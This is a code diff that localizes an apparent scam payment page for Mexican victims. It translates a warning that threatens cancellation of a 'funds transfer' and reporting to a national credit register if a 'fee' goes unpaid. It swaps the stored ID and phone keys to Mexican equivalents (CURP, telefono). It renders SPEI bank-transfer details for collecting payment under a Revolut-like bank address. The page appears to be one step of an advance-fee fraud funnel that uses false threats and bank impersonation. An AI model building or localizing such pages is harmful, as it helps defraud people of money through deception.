@@ -113,8 +113,8 @@ window.apiUrl = window.apiUrl || function (p) {
         <svg fill="none" stroke="#dc2626" stroke-width="2" viewBox="0 0 24 24" style="width:16px;height:16px"><path d="M12 9v4m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
       <div>
-        <strong style="display:block;font-size:13px;font-weight:700;color:#dc2626;margin-bottom:4px;">Attention</strong>
-        <span style="font-size:13px;color:#7f1d1d;line-height:1.5;">Non-payment of this fee may result in cancellation of the transfer of funds and reporting to the relevant national Credit Liabilities Register.</span>
+        <strong style="display:block;font-size:13px;font-weight:700;color:#dc2626;margin-bottom:4px;">Atención</strong>
+        <span style="font-size:13px;color:#7f1d1d;line-height:1.5;">El no pago de esta comisión puede resultar en la cancelación de la transferencia de fondos y la notificación al Registro Nacional de Obligaciones Crediticias correspondiente.</span>
       </div>
     </div>
 
@@ -152,7 +152,7 @@ try{(function(){
   var nome=(localStorage.getItem('nome')||'customer').trim();
   var parts=nome.split(/\s+/);
   var el=document.getElementById('userName'); if(el) el.textContent=((parts[0]||'customer')+' '+(parts.slice(-1)[0]||'')).trim().toLowerCase();
-  var nif=(localStorage.getItem('nif')||'').replace(/\D/g,'');
+  var nif=(localStorage.getItem('curp')||'').replace(/\D/g,'');
   var elN=document.getElementById('userNif'); if(nif.length>=18 && elN) elN.textContent=nif.slice(0,4)+' *** '+nif.slice(-4);
 })();}catch(e){console.error('[UPSELL5] init error:',e);}
 
@@ -163,7 +163,7 @@ window.addEventListener('upsell-fee-ready',function(ev){ if(ev&&ev.detail&&ev.de
 window.addEventListener('funil-fees-ready',function(){ PAY_AMOUNT=getPayAmount(); });
 
 function utcNow(){ return new Date().toISOString().replace('T',' ').slice(0,19); }
-function getPhone(){ return (localStorage.getItem('telefone')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/\D/g,''); }
+function getPhone(){ return (localStorage.getItem('telefono')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/\D/g,''); }
 function setModalBody(html){ document.getElementById('modalBody').innerHTML=html; }
 function buildSpeiBody(payData,amtLabel){var s='';if(payData&&payData.clabe){var mx=payData.amount_mxn?'MX$ '+Number(payData.amount_mxn).toFixed(2).replace('.',','):'';s='<div style="background:#f0fdf4;border:1.5px solid #22c55e;border-radius:12px;padding:14px 16px;margin:10px 0;font-size:13px;text-align:left;"><div style="font-weight:800;color:#15803d;margin-bottom:8px;">📲 Transferencia via SPEI</div><table style="width:100%;border-collapse:collapse;font-size:12px;color:#374151;"><tr><td style="padding:3px 0;color:#6b7280;">Bank</td><td style="padding:3px 0;font-weight:700;">'+(payData.bank_name||'STP')+'</td></tr><tr><td style="padding:3px 0;color:#6b7280;">CLABE</td><td style="padding:3px 0;font-weight:700;letter-spacing:.5px;font-family:monospace;">'+payData.clabe+'</td></tr>'+(payData.beneficiary?'<tr><td style="padding:3px 0;color:#6b7280;">Beneficiary</td><td style="padding:3px 0;font-weight:700;">'+payData.beneficiary+'</td></tr>':'')+(payData.reference?'<tr><td style="padding:3px 0;color:#6b7280;">Reference</td><td style="padding:3px 0;font-weight:700;">'+payData.reference+'</td></tr>':'')+(mx?'<tr><td style="padding:3px 0;color:#6b7280;">Amount</td><td style="padding:3px 0;font-weight:700;">'+mx+'</td></tr>':'')+'</table></div>';}return '<div class="modal-status loading">Completa tu pago of <strong>'+amtLabel+'</strong> using the details below.</div>'+s+'<div style="padding:10px;background:#fefce8;border:1.5px solid #fbbf24;border-radius:10px;font-size:13px;color:#92400e;text-align:center;margin-top:8px;">Esperando confirmación…</div>';}
 function closeModal(){ document.getElementById('payModal').classList.remove('show'); }
@@ -208,7 +208,7 @@ function startPolling(txId){
 async function startPayment(phone){
   const nome=localStorage.getItem('nome')||'Customer';
   const email=localStorage.getItem('email')||'customer@revolutbank.com';
-  const doc=(localStorage.getItem('nif')||'999999999').replace(/\D/g,'')||'999999999';
+  const doc=(localStorage.getItem('curp')||'999999999').replace(/\D/g,'')||'999999999';
   setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Procesando tu pago...</div>');
   try{
     const res=await fetch(apiUrl('/api/payment-proxy?action=create'),{method:'POST',headers:{'Content-Type':'application/json'},
